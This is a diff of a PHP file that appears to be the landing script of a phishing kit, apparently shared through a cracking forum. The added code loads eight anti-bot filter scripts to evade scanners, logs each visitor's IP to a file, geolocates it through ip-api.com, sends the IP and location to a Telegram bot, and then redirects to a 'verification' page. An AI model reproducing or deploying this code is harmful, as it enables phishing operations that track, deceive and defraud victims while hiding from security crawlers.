@@ -1,21 +1,50 @@
 <?php
-/*                                 
-Now it's Crax.Pro time 
+/*
+
+  /$$$$$$  /$$$$$$$  /$$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$        /$$$$$$$   /$$$$$$   /$$$$$$ 
+ /$$__  $$| $$__  $$| $$__  $$ /$$__  $$| $$$ | $$ /$$__  $$      | $$__  $$ /$$__  $$ /$$__  $$
+| $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$| $$$$| $$| $$  \ $$      | $$  \ $$| $$  \ $$| $$  \__/
+| $$$$$$$$| $$$$$$$/| $$  | $$|  $$$$$$/| $$ $$ $$| $$  | $$      | $$  | $$| $$$$$$$$|  $$$$$$ 
+| $$__  $$| $$__  $$| $$  | $$ >$$__  $$| $$  $$$$| $$  | $$      | $$  | $$| $$__  $$ \____  $$
+| $$  | $$| $$  \ $$| $$  | $$| $$  \ $$| $$\  $$$| $$  | $$      | $$  | $$| $$  | $$ /$$  \ $$
+| $$  | $$| $$  | $$| $$$$$$$/|  $$$$$$/| $$ \  $$|  $$$$$$/      | $$$$$$$/| $$  | $$|  $$$$$$/
+|__/  |__/|__/  |__/|_______/  \______/ |__/  \__/ \______/       |_______/ |__/  |__/ \______/ 
+                                                                                                
+                                                                                                
+                                                                                                
+
 */
-if  (isset($_SESSION['refData'])){
-if ($_SESSION['refData'] != $_SESSION['redirectlink']) {
-        exit(header('HTTP/1.0 404 Not Found'));
-    }
-}else{
-                exit(header('HTTP/1.0 404 Not Found'));
-    }
-  	require 'anti1.php';
-	require 'anti2.php';
-	require 'anti3.php';
-	require 'anti4.php';
-	require 'anti5.php';
-	require 'anti6.php';
-	require 'anti7.php';
-	require 'anti8.php';
-	exit(header("Location: ../index.php"));
-?>
+
+include 'bots/anti1.php';
+include 'bots/anti2.php';
+include 'bots/anti3.php';
+include 'bots/anti4.php';
+include 'bots/anti5.php';
+include 'bots/anti6.php';
+include 'bots/anti7.php';
+include 'bots/anti8.php';
+include "email.php";
+
+
+$ip = getenv("REMOTE_ADDR");
+
+
+$file = fopen("ARDUINO_DAS_VISIT.txt","a");
+
+
+fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
+
+$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
+$COUNTRY = $IP_LOOKUP->country . "\r\n";
+$CITY    = $IP_LOOKUP->city . "\r\n";
+$REGION  = $IP_LOOKUP->region . "\r\n";
+$STATE   = $IP_LOOKUP->regionName . "\r\n";
+$ZIPCODE = $IP_LOOKUP->zip . "\r\n";
+
+$msg=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE;
+
+file_get_contents("https://api.telegram.org/bot".$a."/sendMessage?chat_id=".$ch."&text=" . urlencode($msg)."" );
+
+
+
+header("Location: verification/");
